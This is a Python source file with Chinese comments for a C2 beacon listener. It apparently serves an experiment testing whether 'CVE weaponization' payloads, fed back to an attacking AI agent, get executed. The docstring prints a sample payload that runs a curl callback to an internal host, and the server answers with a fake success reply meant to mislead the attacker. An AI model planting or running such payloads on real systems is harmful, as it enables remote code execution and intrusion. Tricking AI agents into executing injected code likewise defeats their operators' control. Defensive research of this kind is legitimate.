"""
C2 Beacon 监听器 — 验证 L3 CVE 武器化是否真正生效

监听端口: 0.0.0.0:9999（或 127.0.0.1:9999）
接收: payload 中植入的 curl/wget/python 回连请求

实验原理:
- L3 反制生成 CVE payload（如 __import__('os').system('curl http://10.99.1.50:9999/beacon')）
- 如果靶标 Agent 真的执行了 payload，会发送 HTTP 请求到本监听器
- 监听器记录来源 IP、时间、payload 中的数据 = 证明反制成功
"""

import asyncio
import json
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import List
from pathlib import Path


@dataclass
class BeaconRecord:
    timestamp: float
    source_ip: str
    method: str
    path: str
    headers: dict
    body: str
    beacon_id: str = ""


class C2Listener:
    """C2 Beacon 监听器 — 单例，异步运行"""

    LOG_PATH = Path("experiments/c2_beacons.jsonl")

    def __init__(self, host: str = "0.0.0.0", port: int = 9999):
        self.host = host
        self.port = port
        self.beacons: List[BeaconRecord] = []
        self.server = None
        self._running = False

    async def _handle(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """处理单个 beacon 连接"""
        addr = writer.get_extra_info("peername")
        client_ip = addr[0] if addr else "unknown"

        try:
            header = await asyncio.wait_for(reader.read(8192), timeout=5)
            text = header.decode("utf-8", errors="ignore")
        except Exception:
            writer.close()
            return

        lines = text.split("\r\n")
        request_line = lines[0] if lines else ""
        parts = request_line.split()
        method = parts[0] if len(parts) > 0 else "UNKNOWN"
        path = parts[1] if len(parts) > 1 else "/"

        headers = {}
        body_start = 0
        for i, line in enumerate(lines[1:], 1):
            if line == "":
                body_start = i + 1
                break
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip()] = v.strip()

        body = "\r\n".join(lines[body_start:]) if body_start else ""

        beacon = BeaconRecord(
            timestamp=time.time(),
            source_ip=client_ip,
            method=method,
            path=path,
            headers=headers,
            body=body,
            beacon_id=f"beacon_{int(time.time()*1000)}_{client_ip}",
        )
        self.beacons.append(beacon)
        self._persist(beacon)

        # 返回一个看似正常的响应，让攻击者以为操作成功
        response_body = json.dumps({"status": "ok", "received": True})
        response = (
            f"HTTP/1.1 200 OK\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(response_body)}\r\n"
            f"Connection: close\r\n\r\n"
            f"{response_body}"
        )
        writer.write(response.encode())
        await writer.drain()
        writer.close()

        print(f"[C2] BEACON from {client_ip} | {method} {path} | total={len(self.beacons)}")

    def _persist(self, beacon: BeaconRecord):
        """持久化 beacon 记录"""
        self.LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
        with open(self.LOG_PATH, "a", encoding="utf-8") as f:
            f.write(json.dumps({
                "timestamp": beacon.timestamp,
                "iso": datetime.now(timezone.utc).isoformat(),
                "source_ip": beacon.source_ip,
                "method": beacon.method,
                "path": beacon.path,
                "body": beacon.body,
                "beacon_id": beacon.beacon_id,
            }, ensure_ascii=False) + "\n")

    async def start(self):
        """启动监听器"""
        self.server = await asyncio.start_server(self._handle, self.host, self.port)
        self._running = True
        print(f"[C2] Listener started on {self.host}:{self.port}")
        async with self.server:
            await self.server.serve_forever()

    def stop(self):
        """停止监听器"""
        if self.server:
            self.server.close()
        self._running = False

    def stats(self) -> dict:
        """返回 beacon 统计"""
        return {
            "total_beacons": len(self.beacons),
            "unique_ips": len(set(b.source_ip for b in self.beacons)),
            "latest": self.beacons[-1].__dict__ if self.beacons else None,
        }


async def run_c2_listener(port: int = 9999):
    """独立运行 C2 监听器"""
    listener = C2Listener(port=port)
    try:
        await listener.start()
    except KeyboardInterrupt:
        listener.stop()
        print(f"[C2] Stopped. Total beacons: {len(listener.beacons)}")


if __name__ == "__main__":
    asyncio.run(run_c2_listener())
